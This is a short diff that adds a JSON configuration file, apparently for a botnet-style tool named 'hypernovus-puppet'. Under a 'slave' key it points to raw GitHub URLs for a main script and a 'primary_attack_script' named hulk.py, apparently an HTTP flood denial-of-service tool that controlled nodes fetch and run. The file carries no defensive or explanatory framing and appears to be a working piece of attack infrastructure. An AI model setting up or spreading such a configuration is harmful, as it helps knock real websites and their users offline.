@@ -1,0 +1,6 @@
+{
+    "slave": {
+        "mainscript": "https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js",
+        "primary_attack_script": "https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py"
+    }
+}
